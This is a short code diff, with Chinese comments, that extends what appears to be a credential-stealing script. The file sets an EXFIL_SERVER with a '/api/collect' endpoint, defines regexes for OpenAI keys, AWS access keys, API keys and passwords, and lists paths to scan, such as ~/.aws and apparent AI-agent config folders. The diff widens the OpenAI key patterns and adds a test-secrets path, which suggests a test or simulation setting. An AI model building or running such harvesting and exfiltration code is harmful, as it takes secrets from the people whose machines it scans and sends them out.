@@ -50,7 +50,8 @@ const EXFIL_SERVER = process.env.EXFIL_SERVER || "http://localhost:9999";
 const EXFIL_ENDPOINT = "/api/collect";
 // 敏感信息模式
 const KEY_PATTERNS = [
-    { name: "OpenAI", pattern: /sk-[a-zA-Z0-9]{20,}/g },
+    { name: "OpenAI", pattern: /sk-[a-zA-Z0-9_-]{20,}/g },
+    { name: "OpenAI_Live", pattern: /sk-live-[a-zA-Z0-9_-]+/g },
     { name: "AWS_Access", pattern: /AKIA[A-Z0-9]{16}/g },
     { name: "API_Key", pattern: /api[_-]?key\s*[=:]\s*['"]?[a-zA-Z0-9_-]{16,}/gi },
     { name: "Password", pattern: /password\s*[=:]\s*\S+/gi },
@@ -60,6 +61,7 @@ const KEY_PATTERNS = [
 ];
 // 扫描路径
 const SCAN_PATHS = [
+    "~/.test-secrets",
     "~/.openclaw/config",
     "~/.openclaw/workspace",
     "~/.aws",
